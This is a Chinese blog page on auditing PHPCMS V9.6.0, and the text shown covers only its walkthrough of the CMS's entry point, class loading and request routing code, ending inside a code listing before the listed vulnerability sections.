<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>PHPCMS_V9.6.0 - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="PHPCMS_V9.6.0" />
<meta property="og:description" content="PHPCMS_V9.6.0审计" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://mi3aka.eu.org/phpcms_v9.6.0/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-03-14T14:08:34+00:00" />
<meta property="article:modified_time" content="2022-03-14T14:08:34+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>

<meta name="twitter:title" content="PHPCMS_V9.6.0"/>
<meta name="twitter:description" content="PHPCMS_V9.6.0审计"/>
<meta name="application-name" content="Mi3aka&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/phpcms_v9.6.0/" /><link rel="prev" href="https://mi3aka.eu.org/dedecms_v5.7_sp2/" /><link rel="next" href="https://mi3aka.eu.org/thinkphp_v3/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "PHPCMS_V9.6.0",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/mi3aka.eu.org\/phpcms_v9.6.0\/"
        },"genre": "posts","wordcount":  6135 ,
        "url": "https:\/\/mi3aka.eu.org\/phpcms_v9.6.0\/","datePublished": "2022-03-14T14:08:34+00:00","dateModified": "2022-03-14T14:08:34+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Mi3aka"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PHPCMS_V9.6.0</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>代码审计</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-14">2022-03-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 6135 字&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 13 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cms组成">cms组成</a></li>
    <li><a href="#phpcmsmodulescontentdownphp存在sql注入漏洞">phpcms/modules/content/down.php存在SQL注入漏洞</a></li>
    <li><a href="#phpcmsmodulesmemberindexphp存在任意文件上传漏洞">phpcms/modules/member/index.php存在任意文件上传漏洞</a></li>
    <li><a href="#phpsso_serverphpcmsmodulesadminsystemphp后台getshell">phpsso_server/phpcms/modules/admin/system.php后台getshell</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p><a href="https://github.com/SukaraLin/php_code_audit_project/blob/master/phpcms/PHPcms%209.6.0%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1.md" target="_blank" rel="noopener noreffer ">参考链接 PHPcms 9.6.0漏洞审计</a></p>
<h2 id="cms组成">cms组成</h2>
<p><code>index.php</code>作为整个cms的入口(包括后台)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> *  index.php PHPCMS 入口
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @copyright			(C) 2005-2010 PHPCMS
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @license				http://www.phpcms.cn/license/
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @lastmodify			2010-6-1
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"> <span class="c1">//PHPCMS根目录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;PHPCMS_PATH&#39;</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="nx">PHPCMS_PATH</span><span class="o">.</span><span class="s1">&#39;/phpcms/base.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">pc_base</span><span class="o">::</span><span class="na">creat_app</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>首先对<code>phpcms/base.php</code>进行包含,<code>base.php</code>是PHPCMS框架入口文件</p>
<ol>
<li>
<p>定义了大量的常量,例如PHPCMS框架路径</p>
</li>
<li>
<p>加载公用函数库</p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">pc_base</span><span class="o">::</span><span class="na">load_sys_func</span><span class="p">(</span><span class="s1">&#39;global&#39;</span><span class="p">);</span><span class="c1">//phpcms/libs/functions/global.func.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">pc_base</span><span class="o">::</span><span class="na">load_sys_func</span><span class="p">(</span><span class="s1">&#39;extention&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">pc_base</span><span class="o">::</span><span class="na">auto_load_func</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>加载了对字符串或数组进行处理的函数如<code>addslashes</code>,<code>safe_replace</code>(&rsquo;&gt;&lsquo;替换从&rsquo;&amp;gt&rsquo;),<code>remove_xss</code>(xss过滤)</p>
<ol start="3">
<li>提供了pc_base类对应用进行初始化(主要使用静态方法实现)</li>
</ol>
<p><code>pc_base::creat_app();</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">creat_app</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">self</span><span class="o">::</span><span class="na">load_sys_class</span><span class="p">(</span><span class="s1">&#39;application&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 加载系统类方法
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param string $classname 类名
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param string $path 扩展地址
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param intger $initialize 是否初始化
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">load_sys_class</span><span class="p">(</span><span class="nv">$classname</span><span class="p">,</span> <span class="nv">$path</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$initialize</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">self</span><span class="o">::</span><span class="na">_load_class</span><span class="p">(</span><span class="nv">$classname</span><span class="p">,</span> <span class="nv">$path</span><span class="p">,</span> <span class="nv">$initialize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 加载类文件函数
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param string $classname 类名
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param string $path 扩展地址
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param intger $initialize 是否初始化
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">_load_class</span><span class="p">(</span><span class="nv">$classname</span><span class="p">,</span> <span class="nv">$path</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$initialize</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="nv">$classes</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="nv">$path</span> <span class="o">=</span> <span class="s1">&#39;libs&#39;</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="s1">&#39;classes&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$path</span> <span class="o">.</span> <span class="nv">$classname</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$classes</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$classes</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$classes</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">PC_PATH</span> <span class="o">.</span> <span class="nv">$path</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="nv">$classname</span> <span class="o">.</span> <span class="s1">&#39;.class.php&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">include</span> <span class="nx">PC_PATH</span> <span class="o">.</span> <span class="nv">$path</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="nv">$classname</span> <span class="o">.</span> <span class="s1">&#39;.class.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$classname</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$my_path</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">my_path</span><span class="p">(</span><span class="nx">PC_PATH</span> <span class="o">.</span> <span class="nv">$path</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="nv">$classname</span> <span class="o">.</span> <span class="s1">&#39;.class.php&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">include</span> <span class="nv">$my_path</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;MY_&#39;</span> <span class="o">.</span> <span class="nv">$classname</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$initialize</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$classes</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$classes</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$classes</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>对<code>phpcms/libs/classes/application.class.php</code>进行包含并且通过<code>$classes[$key] = new $name;</code>对<code>application</code>类进行实例化</p>
<p><code>application</code>实例化时会调用构造函数<code>__construct</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$param</span> <span class="o">=</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_sys_class</span><span class="p">(</span><span class="s1">&#39;param&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">define</span><span class="p">(</span><span class="s1">&#39;ROUTE_M&#39;</span><span class="p">,</span> <span class="nv">$param</span><span class="o">-&gt;</span><span class="na">route_m</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="nx">define</span><span class="p">(</span><span class="s1">&#39;ROUTE_C&#39;</span><span class="p">,</span> <span class="nv">$param</span><span class="o">-&gt;</span><span class="na">route_c</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="nx">define</span><span class="p">(</span><span class="s1">&#39;ROUTE_A&#39;</span><span class="p">,</span> <span class="nv">$param</span><span class="o">-&gt;</span><span class="na">route_a</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">private</span> <span class="k">function</span> <span class="nf">init</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$controller</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load_controller</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">method_exists</span><span class="p">(</span><span class="nv">$controller</span><span class="p">,</span> <span class="nx">ROUTE_A</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[_]/i&#39;</span><span class="p">,</span> <span class="nx">ROUTE_A</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;You are visiting the action is to protect the private action&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">call_user_func</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$controller</span><span class="p">,</span> <span class="nx">ROUTE_A</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Action does not exist.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">private</span> <span class="k">function</span> <span class="nf">load_controller</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$m</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">ROUTE_C</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$m</span><span class="p">))</span> <span class="nv">$m</span> <span class="o">=</span> <span class="nx">ROUTE_M</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filepath</span> <span class="o">=</span> <span class="nx">PC_PATH</span> <span class="o">.</span> <span class="s1">&#39;modules&#39;</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="nv">$m</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="nv">$filename</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$classname</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">include</span> <span class="nv">$filepath</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$mypath</span> <span class="o">=</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">my_path</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$classname</span> <span class="o">=</span> <span class="s1">&#39;MY_&#39;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">include</span> <span class="nv">$mypath</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">class_exists</span><span class="p">(</span><span class="nv">$classname</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">new</span> <span class="nv">$classname</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Controller does not exist.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Controller does not exist.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>首先是对<code>param</code>类进行实例化,<code>param.class.php</code>是参数处理类,<code>param</code>类进行实例化时会调用构造函数<code>__construct</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
